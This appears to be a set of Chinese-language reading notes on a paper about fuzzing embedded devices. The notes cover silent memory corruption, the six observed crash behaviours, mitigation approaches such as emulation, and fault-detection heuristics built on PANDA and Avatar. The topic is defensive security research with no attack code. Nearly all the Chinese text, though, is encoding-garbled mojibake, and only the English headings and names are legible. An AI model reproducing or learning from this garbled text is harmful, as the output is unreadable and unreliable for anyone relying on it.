çš„å¸¸è§è§£å†³æ–¹æ¡ˆæ˜¯æ±‚åŠ©äºäºŒè¿›åˆ¶åŠ¨æ€æ£€æµ‹æ¡†æ¶ã€‚ ä½†æ˜¯ä½œè€…æœ€åæŒ‡å‡ºä¸Šè¿°æ‰€æœ‰é™æ€å’ŒåŠ¨æ€æ£€æµ‹å·¥å…·éƒ½ä¸ç›®æ ‡æ“ä½œç³»ç»Ÿå’Œ CPU ä½“ç³»ç»“æ„ç´§å¯†ç›¸å…³ï¼Œå¹¶ä¸”åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå®ƒä»¬éƒ½ä¸æä¾›å¯¹ Type-II å’Œ Type-III åµŒå…¥å¼è®¾å¤‡çš„æ”¯æŒã€‚ MEMORY CORRUPTIONS IN EMBEDDED SYSTEMS Bugs, Faults, Corruptions \u0026amp; Crashes Van der Veen ç­‰äººåŒºåˆ†äº†ç©ºé—´è®°å¿†é”™è¯¯å’Œæ—¶é—´è®°å¿†é”™è¯¯ã€‚ç¬¬ä¸€ç§ç±»å‹è¡¨ç¤ºå¯¹å†…å­˜å¯¹è±¡çš„è¶Šç•Œè®¿é—®ï¼Œç¬¬äºŒç§ç±»å‹è¡¨ç¤ºå¯¹ä¸å†å­˜åœ¨çš„å†…å­˜å¯¹è±¡çš„è®¿é—® æœ‰çš„å†…å­˜æŸåä¸ä¼šç«‹å³å¼•èµ·ç³»ç»Ÿå´©æºƒï¼Œä½œè€…ç§°ä¹‹ä¸ºé™é»˜å´©æºƒã€‚ é™é»˜å†…å­˜æŸåçš„é‡è¦åæœæ˜¯ï¼Œå®é™…æ•…éšœå¯èƒ½åªä¼šåœ¨ç¨åè¯·æ±‚ç‰¹å®šåŠŸèƒ½æˆ–æ¥æ”¶åˆ°ç‰¹å®šäº‹ä»¶åºåˆ—æ—¶æ‰ä¼šå˜å¾—æ˜æ˜¾ã€‚ æ¡Œé¢ç³»ç»Ÿå› ä¸ºæœ‰å¤šç§é˜²å¾¡æœºåˆ¶ï¼Œæ‰€ä»¥æ›´å®¹æ˜“è§¦å‘è¿™ç§é™é»˜å†…å­˜æŸåï¼Œä½†æ˜¯å¯¹äºåµŒå…¥å¼è®¾å¤‡ç¼ºä¹é˜²å¾¡æœºåˆ¶ï¼Œå¾ˆéš¾æ£€æµ‹åˆ°é™é»˜å†…å­˜æŸå Experimental Setup åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šè§¦å‘ç›¸åŒçš„å†…å­˜æŸåæ¡ä»¶ï¼Œä»¥åˆ†æå®ƒä»¬æ˜¯å¦å±ˆæœäºå¯è§‚å¯Ÿåˆ°çš„å´©æºƒæˆ–å¯¼è‡´é™é»˜æŸåã€‚\nè®¾å¤‡é€‰æ‹©ï¼šé€‰æ‹©äº†ç°æœ‰çš„å•†ç”¨ç°æˆ (COTS) äº§å“ï¼šä»£è¡¨ Type-I ç³»ç»Ÿçš„è·¯ç”±å™¨å’Œä»£è¡¨ Type-II è®¾å¤‡çš„ IP æ‘„åƒæœºã€‚ æ¼æ´ç¨‹åºéƒ¨ç½²ï¼šå¯¹äº I II å‹è®¾å¤‡ï¼Œç›´æ¥ç¼–è¯‘æ¼æ´ç¨‹åºç„¶ååŠ è½½åˆ°è®¾å¤‡ä¸Šä¾¿å¯ï¼Œå¯¹äº III å‹è®¾å¤‡éœ€è¦å°†æµ‹è¯•ä»£ç åŒ…å«åœ¨å›ºä»¶ä¸­ç„¶åå¯¹å…¶ç¼–è¯‘ï¼Œç„¶åå°†å›ºä»¶åŠ è½½åˆ°è®¾å¤‡ä¸Šã€‚ Atificial Vulnerabilities ä½¿ç”¨åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºå’ŒåŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºä½œä¸ºç©ºé—´å†…å­˜æŸåçš„ç¤ºä¾‹ï¼Œå¹¶ä½¿ç”¨ç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨å’ŒåŒé‡é‡Šæ”¾æ¼æ´ä½œä¸ºæ—¶é—´å†…å­˜æŸåçš„ç¤ºä¾‹ã€‚ è¿˜æ’å…¥äº†ä¸€ä¸ªæ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨äºä¿¡æ¯æ³„æ¼æˆ–ä»»æ„å†…å­˜æŸåã€‚ Observed Behavior æ¡Œé¢ç³»ç»Ÿæ¯æ¬¡éƒ½å¯ä»¥è§¦å‘å´©æºƒ åµŒå…¥å¼è®¾å¤‡å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿæ£€æµ‹åˆ°æ•…éšœï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒä»¬ç”šè‡³ç»§ç»­æ‰§è¡Œè€Œæ²¡æœ‰æ˜æ˜¾çš„å½±å“â€”â€”å°½ç®¡ç³»ç»Ÿçš„åº•å±‚å†…å­˜å·²æŸåã€‚è§‚æµ‹åˆ°ä»¥ä¸‹å…­ç§çŠ¶æ€ R1ï¼šå¯ä»¥è§‚æµ‹åˆ°çš„å´©æºƒ R2ï¼šè®¾å¤‡é‡å¯ R1 å’Œ R2 å¯¹äº fuzzing å™¨æ¥è¯´æ˜¯å¯ä»¥æ£€æµ‹åˆ°çš„ï¼Œæ˜¯æœ€å¥½çš„ç»“æœ R3ï¼šæŒ‚èµ·ï¼šç›®æ ‡æŒ‚èµ·å¹¶åœæ­¢å“åº”æ–°è¯·æ±‚ï¼Œå¯èƒ½é™·å…¥æ­»å¾ªç¯ R4ï¼šéšåå´©æºƒï¼šç›®æ ‡ç³»ç»Ÿç»§ç»­æ‰§è¡Œä¸€æ®µä¸å¯å¿½è§†çš„æ—¶é—´åå´©æºƒ æŒ‚èµ·å’ŒåæœŸå´©æºƒï¼ˆR3 å’Œ R4ï¼‰å¯èƒ½æ›´éš¾å¤„ç†ï¼Œç‰¹åˆ«æ˜¯å½“å´©æºƒå»¶è¿Ÿè¶³å¤Ÿé•¿ä»¥è‡³äºæ¨¡ç³Šå™¨å¯èƒ½å·²ç»å‘ç›®æ ‡ç³»ç»Ÿå‘é€äº†å¤šä¸ªå…¶ä»–è¾“å…¥å¹¶ä¸”å› æ­¤å¯¼è‡´æŸåçš„è¾“å…¥å°†æ˜¯éš¾ä»¥è¯†åˆ«ã€‚ R5ï¼šæ•…éšœï¼šç³»ç»Ÿæ²¡æœ‰å´©æºƒï¼Œä½†æ˜¯æŠ¥å‘Šäº†é”™è¯¯çš„æ•°æ®å’Œä¸æ­£å¸¸çš„ç»“æœ ä¸ºäº†æ£€æµ‹è¿™ç§æƒ…å†µï¼Œæ¨¡ç³Šå™¨éœ€è¦çŸ¥é“æ­£ç¡®çš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Œä¸€ç§å¯èƒ½çš„å˜é€šæ–¹æ³•åŒ…æ‹¬åœ¨ä¸¤ä¸ªè¿ç»­çš„è¾“å…¥ä¹‹é—´æ’å…¥ä¸€äº›è¾“å‡ºå·²çŸ¥çš„åŠŸèƒ½æµ‹è¯•è¯·æ±‚ã€‚ç„¶è€Œï¼Œå³ä½¿è¿™ä¸ªè§£å†³æ–¹æ¡ˆè¶³ä»¥æ£€æµ‹åˆ°æ•…éšœï¼Œå®ƒä¹Ÿä¼šåœ¨æ¨¡ç³Šæµ‹è¯•ä¸­å¼•å…¥ç›¸å½“å¤§çš„å»¶è¿Ÿã€‚ R6ï¼šæ— å½±å“ï¼šå°½ç®¡å†…å­˜å·²æŸåï¼Œç›®æ ‡ä»ç„¶æ­£å¸¸è¿è¡Œï¼Œæ²¡æœ‰æ˜æ˜¾çš„å‰¯ä½œç”¨ã€‚ è¿™ç§æœ€éš¾æ£€æµ‹ MITIGATIONS Static Instrumentation. å‰ææ˜¯éœ€è¦æºä»£ç å’Œç¼–è¯‘å·¥å…·é“¾ å…¸å‹çš„ instrumentation åŒ…æ‹¬å¤šç§æŠ€æœ¯çš„ç»„åˆï¼šæ”¶é›†æ‰§è¡Œè½¨è¿¹ä»¥æµ‹é‡è¦†ç›–ç‡ä»¥æ”¹å˜æ¨¡ç³Šè¾“å…¥ï¼Œæ·»åŠ å†…å­˜åˆ†é…æ£€æŸ¥ï¼Œæˆ–ä½¿ç”¨ä¾‹å¦‚æ§åˆ¶æµå®Œæ•´æ€§æ¥å¼ºåŒ–ç¨‹åºã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™äº›å·¥å…·ä¸­çš„å¤§å¤šæ•°è¿˜ä¸èƒ½ç”¨äºåµŒå…¥å¼ç³»ç»Ÿã€‚ Binary Rewriting å‰æè¦æœ‰äºŒè¿›åˆ¶å›ºä»¶é•œåƒï¼Œè®¾å¤‡ åæ±‡ç¼–å›ºä»¶çš„äºŒè¿›åˆ¶é•œåƒï¼Œæ¢å¤å†…å­˜è¯­ä¹‰ã€è¾¹ç•Œå’Œæ•°æ®ç»“æ„å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå…¶æ¬¡åµŒå…¥å¼è®¾å¤‡çš„å†…å­˜ä½¿ç”¨ç»å¸¸è¢«ä¼˜åŒ–æ¥é™ä½æˆæœ¬ï¼Œå‡ ä¹æ²¡æœ‰ç•™ç»™æ·»åŠ å¤æ‚ instrumentation çš„ç©ºé—´ã€‚ Physical Re-Hosting å‰æéœ€è¦æºä»£ç ï¼Œç¼–è¯‘é“¾ï¼Œä¸åŒçš„è®¾å¤‡ æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥å°† II å‹è®¾å¤‡çš„ç³»ç»Ÿé‡æ–°ç¼–è¯‘åˆ°æ›´æ˜“äºæ£€æµ‹çš„ I å‹è®¾å¤‡ä¸Šï¼Œæˆ–è€… I å‹è®¾å¤‡ç¼–è¯‘åˆ°æ¡Œé¢ç³»ç»Ÿä¸Š é™¤äº†å…ˆå†³æ¡ä»¶éš¾ä»¥å®ç°å¤–ï¼Œåœ¨ä¸åŒè®¾å¤‡ä¸Šé‡ç°åŸè®¾å¤‡ä¸Šçš„æ¼æ´ä¹Ÿå…·æœ‰æŒ‘æˆ˜æ€§ï¼Œç”±äºä¸åŒçš„ä½“ç³»ç»“æ„æˆ–è€…é‡æ–°ç¼–è¯‘å¼•å…¥çš„æ›´æ”¹å¯èƒ½ä¼šè®©åŸæœ‰çš„æ¼æ´ä¸å†å‡ºç°ã€‚ Full Emulation å‰æè¦æœ‰å›ºä»¶é•œåƒï¼Œå¤–è®¾æ¨¡æ‹Ÿå™¨ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä» Type-I å›ºä»¶ä¸­æå–çš„åº”ç”¨ç¨‹åºå¯ä»¥è™šæ‹Ÿåœ°é‡æ–°æ‰˜ç®¡ï¼Œå³ï¼Œå®ƒä»¬å¯ä»¥åœ¨é»˜è®¤æ¨¡æ‹Ÿå™¨ä¸Šè¿è¡Œçš„é€šç”¨æ“ä½œç³»ç»Ÿä¸­æ‰§è¡Œã€‚ æ‰©å±• Qemu ä»¥æ¨¡æ‹Ÿ STM32 èŠ¯ç‰‡çš„ Qemu STM32 é¡¹ç›®è¡¨æ˜ï¼Œå½“å®Œæ•´çš„ç¡¬ä»¶æ–‡æ¡£å¯ç”¨æ—¶ï¼Œé€šè¿‡ç›¸å½“å¤§çš„åŠªåŠ›æ¥å®ç°ç¡¬ä»¶æ¨¡æ‹Ÿï¼Œä¹Ÿå¯ä»¥å®Œå…¨æ¨¡æ‹Ÿ Type-III å›ºä»¶æ˜ åƒã€‚ è¿™ä¸ªè§£å†³æ–¹æ¡ˆå¯ä»¥å¤§å¤§æ”¹å–„æ¨¡ç³Šã€‚é¦–å…ˆï¼Œæµ‹è¯•å®éªŒå¯ä»¥åœ¨æ²¡æœ‰ç‰©ç†è®¾å¤‡çš„æƒ…å†µä¸‹è¿›è¡Œï¼Œå› æ­¤å¯ä»¥å®ç°æ›´å¤§çš„å¹¶è¡ŒåŒ–ã€‚å…¶æ¬¡ï¼ŒåŠ¨æ€æ£€æµ‹æŠ€æœ¯å¯ä»¥å¾ˆå®¹æ˜“åœ°åº”ç”¨ï¼Œä»¿çœŸå™¨å¯ä»¥ç”¨æ¥æ”¶é›†å¤§é‡å…³äºè¿è¡Œå›ºä»¶çš„ä¿¡æ¯ã€‚ è¿™ç§è§£å†³æ–¹æ¡ˆçš„ç¼ºç‚¹æ˜¯ï¼Œå®ƒåªé€‚ç”¨äºç›®æ ‡æ‰€è®¿é—®çš„æ‰€æœ‰å¤–è®¾éƒ½æ˜¯å·²çŸ¥çš„å¹¶ä¸”å¯ä»¥æˆåŠŸæ¨¡æ‹Ÿçš„æƒ…å†µï¼Œä¸å¹¸çš„æ˜¯ï¼Œè¿™ç§æƒ…å†µå¾ˆå°‘å‘ç”Ÿã€‚æ€»çš„æ¥è¯´ï¼Œèƒ½å¤Ÿåœ¨æ¨¡æ‹Ÿå™¨ä¸­è¿è¡Œä»»æ„å›ºä»¶ä»ç„¶æ˜¯ä¸€ä¸ªå¼€æ”¾çš„ç ”ç©¶é—®é¢˜ã€‚ Partial Emulation å‰æéœ€è¦å›ºä»¶æ˜ åƒã€è®¾å¤‡ è¿™ç§æ–¹æ³•é¦–å…ˆç”± Avatar[54]å’Œ Surrogates[28]æå‡ºç”¨äº Type-III è®¾å¤‡ï¼Œç„¶ååœ¨ PROSPECT[24]ï¼Œ[25]ä¸­æ‰©å±•åˆ° Type-I ç³»ç»Ÿã€‚æ­¤è§£å†³æ–¹æ¡ˆèƒŒåçš„ä¸€èˆ¬æ€æƒ³æ˜¯ä½¿ç”¨ç»è¿‡ä¿®æ”¹çš„æ¨¡æ‹Ÿå™¨ (å…¶ä¸­æ‰§è¡Œå›ºä»¶ä»£ç ) å°†å¤–å›´äº¤äº’è½¬å‘åˆ°å®é™…çš„ç‰©ç†è®¾å¤‡ã€‚å…¶ç»“æœæä¾›äº†å®Œå…¨æ¨¡æ‹Ÿè§£å†³æ–¹æ¡ˆçš„ä¼˜ç‚¹ï¼Œè€Œæ— éœ€äº†è§£å’Œæ¨¡æ‹Ÿ I/O æ“ä½œã€‚ç„¶è€Œï¼Œæ­¤è§£å†³æ–¹æ¡ˆåœ¨çµæ´»æ€§æ–¹é¢æ‰€è·å¾—çš„å¥½å¤„æ˜¯ç‰ºç‰²äº†æ€§èƒ½ (ç”±äºä¸å®é™…è®¾å¤‡çš„é¢å¤–äº¤äº’) å’Œå¯ä¼¸ç¼©æ€§ (ç”±äºå½“å‰éœ€è¦å°†æ¯ä¸ªæ¨¡æ‹Ÿå®ä¾‹ä¸ç‰©ç†è®¾å¤‡é…å¯¹)ã€‚ Hardware-Supported Instrumentation å‰æéœ€è¦è®¾å¤‡ï¼Œé«˜çº§è°ƒè¯•åŠŸèƒ½ (ä¾‹å¦‚ï¼Œè·Ÿè¸ªè°ƒè¯•ç«¯å£å’Œè°ƒè¯•å™¨) å¦‚æœæµ‹è¯•äººå‘˜å¯ä»¥è®¿é—®å…·æœ‰å…ˆè¿›ç¡¬ä»¶æ£€æµ‹æœºåˆ¶ (å¦‚å®æ—¶è·Ÿè¸ª) çš„ç‰©ç†è®¾å¤‡ï¼Œåˆ™å¯èƒ½æ”¶é›†è¶³å¤Ÿçš„ä¿¡æ¯æ¥æ”¹è¿›è®¾å¤‡æ‰§è¡ŒæœŸé—´çš„æ•…éšœæ£€æµ‹ã€‚ä¾‹å¦‚ï¼ŒèŠ¯ç‰‡åˆ¶é€ å•†é€šå¸¸åµŒå…¥ç¡¬ä»¶è·Ÿè¸ªåŠŸèƒ½ï¼Œå¦‚ ARM çš„åµŒå…¥å¼è·Ÿè¸ª Macrocell (ETM) å’Œ Coresight è°ƒè¯•å’Œè·Ÿè¸ªï¼Œæˆ–è‹±ç‰¹å°”çš„å¤„ç†å™¨è·Ÿè¸ª (PT) æŠ€æœ¯ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™ç§è·Ÿè¸ªç¡¬ä»¶çš„å¯ç”¨æ€§æ˜¯å¯å˜çš„ã€‚åœ¨ä½ç«¯è®¾å¤‡ (é€šå¸¸æ˜¯ iii å‹è®¾å¤‡) ä¸­ï¼Œåˆ¶é€ å•†å¾€å¾€ä¸åŒ…æ‹¬ä»»ä½•è·Ÿè¸ªåŠŸèƒ½ï¼Œå› ä¸ºè¿™ç§æœºåˆ¶ä¼šå¯¹èŠ¯ç‰‡è¡¨é¢äº§ç”Ÿç›¸å¯¹è¾ƒå¤§çš„å½±å“ï¼Œå› æ­¤å¯¹æˆæœ¬ä¹Ÿä¼šäº§ç”Ÿå½±å“ã€‚å¼€å‘è®¾å¤‡å¯èƒ½æœ‰è¿™æ ·çš„è®¾æ–½ (æœ‰æ—¶åœ¨åˆ¶é€ ä¹‹å‰åœ¨ FPGA ä¸Šæµ‹è¯•å¾®æ§åˆ¶å™¨è®¾è®¡)ï¼Œä½†è¿™åœ¨å•†ä¸šç”Ÿäº§è®¾å¤‡ä¸­ä¸å¤ªå¸¸è§ã€‚æœ€åï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè°ƒè¯•è®¿é—®å¯èƒ½å­˜åœ¨ï¼Œä½†ä¸å¯ç”¨ï¼Œä»¥é˜²æ­¢ç¬¬ä¸‰æ–¹åˆ†æã€‚ åœ¨æµ‹è¯•çœŸå®è®¾å¤‡æ—¶ï¼Œæ‰¾åˆ°å¯ç”¨çš„ç¡¬ä»¶è·Ÿè¸ªæ”¯æŒçš„å¯èƒ½æ€§éå¸¸ä½ã€‚ æ€»ç»“ æ–¹æ¡ˆ ABC è¦æ±‚æµ‹è¯•äººå‘˜ä¿®æ”¹å›ºä»¶é•œåƒï¼Œä½†æ˜¯å› ä¸ºç§ç§å›°éš¾ï¼Œåœ¨æ‰§è¡Œç¬¬ä¸‰æ–¹å®‰å…¨æµ‹è¯•æ—¶ï¼Œè¿™å¾ˆå°‘æ˜¯ä¸€ä¸ªé€‰é¡¹ã€‚ æ–¹æ¡ˆ DEF ä¸éœ€è¦ä¿®æ”¹å›ºä»¶é•œåƒï¼Œä½†æ˜¯éœ€è¦é¢å¤–çš„æŠ€æœ¯ (è½¯ä»¶æ¨¡æ‹Ÿå™¨æˆ–ç¡¬ä»¶è·Ÿè¸ªæ”¯æŒ) æ¥æ”¶é›†æœ‰å…³æ­£åœ¨è¿è¡Œçš„å›ºä»¶çš„ä¿¡æ¯ã€‚ FAULT DETECTION HEURISTICSï¼ˆæ•…éšœæ£€æµ‹å¯å‘å¼ï¼‰ è¿™äº›å¯å‘å¼ç®—æ³•æ˜¯ç‹¬ç«‹äºå®ç°çš„ï¼Œè¿™æ ·ä¸ä»…å¯ä»¥åœ¨å®æ—¶åˆ†æè®¾ç½®ä¸­å·¥ä½œ (å°±åƒå›ºä»¶åœ¨æ¨¡æ‹Ÿå™¨ä¸­è¿è¡Œæ—¶é‚£æ ·)ï¼Œè€Œä¸”è¿˜å¯ä»¥å¯¹ä»¥å‰æ”¶é›†çš„æ‰§è¡Œè·Ÿè¸ªè¿›è¡Œâ€œäº‹ååˆ†æâ€(å°±åƒåœ¨åŸºäºç¡¬ä»¶çš„è·Ÿè¸ªæœºåˆ¶ä¸­é‚£æ ·)ã€‚\nSegment Tracking æ®µè·Ÿè¸ªå¯èƒ½æ˜¯æ—¨åœ¨æ£€æµ‹éæ³•å†…å­˜è®¿é—®çš„æœ€ç®€å•æŠ€æœ¯ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯è§‚å¯Ÿæ‰€æœ‰å†…å­˜è¯»å†™å¹¶éªŒè¯å®ƒä»¬æ˜¯å¦å‘ç”Ÿåœ¨æœ‰æ•ˆä½ç½®ï¼Œä»è€Œä»¥æŸç§æ–¹å¼æ¨¡ä»¿ MMU æ£€æµ‹åˆ†æ®µé”™è¯¯ã€‚è¿™ç§æŠ€æœ¯åªéœ€è¦äº†è§£ç›®æ ‡çš„å†…å­˜è®¿é—®å’Œå†…å­˜æ˜ å°„ã€‚ä¸¤è€…éƒ½å¯ä»¥åœ¨æ¨¡æ‹Ÿå™¨ä¸­è½»æ¾è®¿é—®ï¼Œä½†æ˜¯ï¼Œå½“åªæœ‰è·Ÿè¸ªå¯ç”¨æ—¶ï¼Œå¯ä»¥é€šè¿‡é€†å‘å·¥ç¨‹è·å¾—å†…å­˜æ˜ å°„ã€‚\nFormat Specifier Tracking æœ¬è´¨ä¸Šï¼Œæ­¤ä¿æŠ¤éªŒè¯æ ¼å¼å­—ç¬¦ä¸²è¯´æ˜ç¬¦åœ¨è¿›å…¥ printf () ç³»åˆ—å‡½æ•°æ—¶æŒ‡å‘æœ‰æ•ˆä½ç½®ã€‚åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸å­˜åœ¨åŠ¨æ€ç”Ÿæˆçš„æ ¼å¼å­—ç¬¦ä¸²è¯´æ˜ç¬¦ï¼Œé‚£äº›æœ‰æ•ˆä½ç½®å¿…é¡»ä½äºåªè¯»æ®µå†…ã€‚æ€»è€Œè¨€ä¹‹ï¼Œè¿™é¡¹æŠ€æœ¯ä¸ä»…éœ€è¦äº†è§£æ ¼å¼å¤„ç†å‡½æ•°çš„ä½ç½®ï¼Œè¿˜éœ€è¦äº†è§£è¾“å…¥å…¶ä¸­ä¸€ä¸ªå‡½æ•°æ—¶çš„å¯„å­˜å™¨çŠ¶æ€å’Œå‚æ•°é¡ºåºã€‚ç›¸åº”å‡½æ•°çš„ä½ç½®åŠå…¶å‚æ•°é¡ºåºéƒ½å¯ä»¥é€šè¿‡é€†å‘å·¥ç¨‹æˆ–å›ºä»¶çš„è‡ªåŠ¨é™æ€åˆ†æè·å¾—ã€‚\nHeap Object Tracking è¯¥æŠ€æœ¯æ—¨åœ¨æ£€æµ‹ä¸æ—¶é—´å’Œç©ºé—´å †ç›¸å…³çš„é”™è¯¯ï¼Œå¹¶å—åˆ° [43] ä¸­ä»‹ç»çš„æ£€æµ‹å’Œè¿è¡Œæ—¶éªŒè¯æ–¹æ³•çš„å½±å“ã€‚å®ƒé€šè¿‡è¯„ä¼°åˆ†é…å’Œé‡Šæ”¾å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ä»¥åŠè®°å½•å †å¯¹è±¡çš„ä½ç½®å’Œå¤§å°æ¥å®ç°å…¶ç›®æ ‡ã€‚è¿™å…è®¸è½»æ¾æ£€æµ‹è¶Šç•Œå†…å­˜è®¿é—®æˆ–å¯¹å·²é‡Šæ”¾å¯¹è±¡çš„è®¿é—®ã€‚ç„¶è€Œï¼Œè¿™ç§å¯å‘å¼æ–¹æ³•å–å†³äºå¤šç§ä¿¡æ¯ï¼šå·²æ‰§è¡Œçš„æŒ‡ä»¤ã€å¯„å­˜å™¨çš„çŠ¶æ€ã€å†…å­˜è®¿é—®ä»¥åŠæœ‰å…³åˆ†é…å’Œé‡Šæ”¾å‡½æ•°çš„çŸ¥è¯†ã€‚åè€…å¯ä»¥é€šè¿‡é€†å‘å·¥ç¨‹æˆ–é€šè¿‡ä½¿ç”¨é«˜çº§æ–¹æ³•æ¥å‘ç°è‡ªå®šä¹‰åˆ†é…å™¨æ¥æ£€ç´¢ï¼Œå¦‚ MemBrush æ‰€å±•ç¤ºçš„ã€‚\nCall Stack Tracking è°ƒç”¨å †æ ˆè·Ÿè¸ªæ­£åœ¨å¤åˆ¶ä¼ ç»Ÿçš„å½±å­å †æ ˆä¿æŠ¤ [53]ï¼Œå› æ­¤æ—¨åœ¨æ£€æµ‹ä¸è¿”å›è¢«è°ƒç”¨è€…çš„å‡½æ•°ã€‚è¿™æœ‰åŠ©äºè¯†åˆ«è¦†ç›–å‡½æ•°è¿”å›åœ°å€çš„åŸºäºå †æ ˆçš„å†…å­˜æŸåã€‚å®ƒé€šè¿‡ç›‘è§†æ‰€æœ‰ç›´æ¥å’Œé—´æ¥å‡½æ•°è°ƒç”¨å’Œè¿”å›æŒ‡ä»¤æ¥å®ç°ã€‚ç„¶è€Œï¼Œç”±äºåµŒå…¥å¼è®¾å¤‡é€šå¸¸æ˜¯ä¸­æ–­é©±åŠ¨çš„ï¼Œè¿™ç§è¯•æ¢æ³•å¯èƒ½ä¼šå¯¼è‡´æ¼æŠ¥ã€‚ä½†æ˜¯å®ƒéœ€è¦æœ€å°‘çš„ä¿¡æ¯ï¼šåªéœ€è¦æ‰§è¡ŒæŒ‡ä»¤çš„çŸ¥è¯†ã€‚\nCall Frame Tracking è°ƒç”¨å¸§è·Ÿè¸ªæ˜¯è°ƒç”¨å †æ ˆè·Ÿè¸ªæŠ€æœ¯çš„æ›´é«˜çº§ç‰ˆæœ¬ï¼Œå®ƒå¯ä»¥åœ¨å‘ç”Ÿæ—¶æ£€æµ‹ç²—ç²’åº¦çš„åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºï¼Œè€Œä¸ä¼šå‡ºç°æ¼æŠ¥ã€‚æœ¬è´¨ä¸Šï¼Œå †æ ˆå¸§æ˜¯é€šè¿‡è·Ÿè¸ªå‡½æ•°è°ƒç”¨æ¥å®šä½çš„ï¼Œç„¶åæ£€æŸ¥è¿ç»­çš„å†…å­˜è®¿é—®æ˜¯å¦è·¨è¶Šå †æ ˆå¸§ã€‚å› æ­¤ï¼Œè¿™éœ€è¦è¯†åˆ«æ‰§è¡Œçš„æŒ‡ä»¤ä»¥åŠå¯„å­˜å™¨å€¼ï¼Œä»¥åœ¨å‡½æ•°å…¥å£æ—¶æå–å †æ ˆæŒ‡é’ˆå€¼ã€‚ç„¶åï¼Œå¿…é¡»è§‚å¯Ÿå†…å­˜è®¿é—®ä»¥æ£€æµ‹å®é™…æŸåã€‚\nStack Object Tracking å †æ ˆå¯¹è±¡è·Ÿè¸ªåŒ…æ‹¬å¯¹å †æ ˆå˜é‡è¶Šç•Œè®¿é—®çš„ç»†ç²’åº¦æ£€æµ‹ï¼Œè¿™æ˜¯å— Serebryany ç­‰äººæå‡ºçš„å †å¯¹è±¡è·Ÿè¸ªæ–¹æ³•çš„å¯å‘ã€‚ [43]ã€‚å› æ­¤ï¼Œæ ¹æ®å †æ ˆä¸­çš„å„ä¸ªå˜é‡å¤§å°å’Œä½ç½®æ£€æŸ¥æ‰§è¡ŒæœŸé—´è§‚å¯Ÿåˆ°çš„å†…å­˜è¯»å–å’Œå†™å…¥ã€‚æ˜¾ç„¶ï¼Œè¿™éœ€è¦è·Ÿè¸ªæ‰§è¡Œçš„æŒ‡ä»¤å’Œå†…å­˜è®¿é—®ï¼Œä»¥åŠæœ‰å…³å †æ ˆå˜é‡çš„è¯¦å°½ä¿¡æ¯ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬ä½¿ç”¨è°ƒè¯•ç¬¦å·ä¸­å­˜åœ¨çš„å˜é‡ä¿¡æ¯ã€‚ç„¶è€Œï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯ä»¥ä»äºŒè¿›åˆ¶ä»£ç ä¸­ä»¥è‡ªåŠ¨æ–¹å¼æ£€ç´¢æ­¤ç±»ä¿¡æ¯ï¼Œæ­£å¦‚ä¹‹å‰çš„å‡ é¡¹ç ”ç©¶ [22]ã€[47] æ‰€æå‡ºçš„é‚£æ ·ã€‚ IMPLEMENTATION ä½œè€…åŸºäº PANDA (åŠ¨æ€åˆ†æå¹³å°) å’Œ Avatar (ç”¨äºåµŒå…¥å¼è®¾å¤‡åŠ¨æ€åˆ†æçš„ç¼–æ’æ¡†æ¶)ï¼Œç¼–å†™äº†ç¨‹åºï¼Œå¹¶å°†å…¶å¼€æº æ€»ä¹‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ PANDA æ¥æ¨¡æ‹Ÿå›ºä»¶ï¼Œå¹¶ä¾èµ–å…¶æ’ä»¶ç³»ç»Ÿæ¥è·å¾—éƒ¨åˆ†æˆ–å®Œå…¨æ¨¡æ‹Ÿå›ºä»¶æ‰§è¡Œæ—¶çš„å®æ—¶åé¦ˆã€‚æ‰€æœ‰è¿™ä¸€åˆ‡éƒ½ç”± Avatar ç¼–æ’æ‰§è¡Œï¼Œå¹¶æœ‰é€‰æ‹©åœ°å°†æ‰§è¡Œå’Œå†…å­˜è®¿é—®é‡å®šå‘åˆ°ç‰©ç†è®¾å¤‡ã€‚ Avatar è¿˜æä¾›äº†ä¿å­˜å¿«ç…§çš„åŠŸèƒ½ã€‚ EXPERIMENTS ç›®çš„ï¼š\nå°†å¯å‘å¼æ–¹æ³•é›†æˆåˆ°å·¥å…·ä¸­ æµ‹é‡æ–¹æ³•å¸¦æ¥çš„ç³»ç»Ÿå¼€é”€ ç›®æ ‡è®¾ç½® å››ç§å®éªŒè®¾ç½®ï¼š\nNATä¸æ·»åŠ ä»»ä½•å¯å‘å¼æ–¹æ³•çš„æ¨¡ç³Šæµ‹è¯•ï¼Œä½œä¸ºåŸºå‡† PE/MFå¸¦æœ‰å†…å­˜è½¬å‘çš„éƒ¨åˆ†ä»¿çœŸï¼šå°† I/O æ“ä½œè½¬å‘åˆ°å®é™…è®¾å¤‡ PE/PMå…·æœ‰å¤–å›´å»ºæ¨¡çš„éƒ¨åˆ†ä»¿çœŸï¼šå›ºä»¶æ˜¯æ¨¡æ‹Ÿçš„ï¼Œå¤–å›´è®¾å¤‡äº¤äº’æ˜¯é€šè¿‡ä½¿ç”¨ Avatar å†…éƒ¨çš„ä¸“ç”¨è„šæœ¬æ¨¡æ‹Ÿå¤–å›´è®¾å¤‡è¡Œä¸ºæ¥å¤„ç†çš„ï¼Œè¿™å…è®¸åœ¨æ²¡æœ‰ç‰©ç†è®¾å¤‡å­˜åœ¨çš„æƒ…å†µä¸‹è¿›è¡Œå®éªŒã€‚ 